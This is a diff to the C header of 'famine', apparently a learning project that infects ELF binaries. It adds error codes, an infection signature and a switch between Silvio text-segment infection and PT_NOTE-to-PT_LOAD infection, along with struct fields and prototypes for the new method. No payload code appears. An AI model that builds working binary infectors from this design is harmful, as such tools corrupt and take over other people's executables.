@@ -64,6 +64,8 @@ enum e_error
     ERROR_LSEEK,
     ERROR_MMAP,
     ERROR_STAT,
+    // Input error
+    ERROR_INPUT_ARGUMENTS_NUMBERS,
     // File type error
     ERROR_NOT_ELF,
     ERROR_NOT_ELF32,
@@ -71,6 +73,8 @@ enum e_error
     ERROR_NOT_EXECUTABLE_BINARY,
     ERROR_ELF_NOT_LITTLE_ENDIAN,
     ERROR_FILE_IS_ALREADY_INFECTED,
+    // Infection error
+    ERROR_SECTION_NOT_FOUND,
     // Payload error
     ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD,
     ERROR_RET2OEP_NOT_FOUND,
@@ -81,9 +85,8 @@ enum e_error
     ERROR_GETTEXTSIZE_NOT_FOUND,
     // Functions specific error
     ERROR_CONCAT_STRINGS,
-    // Others error
-    ERROR_INPUT_ARGUMENTS_NUMBERS,
-    NB_OF_ERROR_CODES /* Always keep last */
+    // Always keep last
+    NB_OF_ERROR_CODES
 };
 
 #define DEBUG false
@@ -94,6 +97,11 @@ enum e_error
 #define PAGE_SIZE 0x1000
 #define SECTION_TO_ENCRYPT_NAME ".text"
 #define KEY_LEN 0x80
+
+#define FORCE_PT_NOTE_TO_PT_LOAD_INFECTION true
+#define FORCE_SILVIO_TEXT_INFECTION false
+
+#define INFECTION_SIGNATURE 7
 
 /* Custom types for 32bit compatibility. */
 #ifdef ARCH_32
@@ -141,15 +149,19 @@ typedef struct s_famine
 
     t_elf_ehdr *ehdr;
     t_elf_phdr *phdr;
+    t_elf_phdr p_note;
+    t_elf_phdr p_data;
     t_elf_shdr *shdr;
     t_elf_addr new_entry_point;
     t_elf_addr old_entry_point;
     t_elf_addr payload_vaddr;
 
-    t_elf_off text_p_start_offset;
-    t_elf_off text_p_end_offset;
-    size_t text_p_size;
-    t_elf_addr text_p_vaddr;
+    t_elf_off p_text_start_offset;
+    t_elf_off p_text_end_offset;
+    size_t p_text_size;
+    t_elf_addr p_text_vaddr;
+
+    t_elf_off p_data_end_offset;
 
     t_elf_off encrypt_s_start_offset;
     t_elf_off encrypt_s_end_offset;
@@ -184,6 +196,7 @@ int get_binary_data(char *file_name, t_famine *famine);
 void overwrite_original_binary(t_famine *famine);
 
 void silvio_text_infection(t_famine *famine);
+void pt_note_to_pt_load_infection(t_famine *famine);
 
 size_t find_keysection_offset_elf64(t_famine *famine);
 size_t find_ret2oep_offset_elf64(t_famine *famine);
@@ -213,6 +226,10 @@ size_t find_gettextsectionaddr_offset_elf64(t_famine *famine);
 size_t find_getencryptedsectionsize_offset_elf64(t_famine *famine);
 size_t find_gettextsize_offset_elf64(t_famine *famine);
 size_t find_ret2oep_offset_elf64(t_famine *famine);
+
+bool is_text_segment(const t_elf_phdr segment);
+bool is_data_segment(const t_elf_phdr segment);
+bool is_note_segment(const t_elf_phdr segment);
 
 void set_famine_ptrs_to_null(t_famine *famine);
 void print_famine_infos(t_famine *famine);
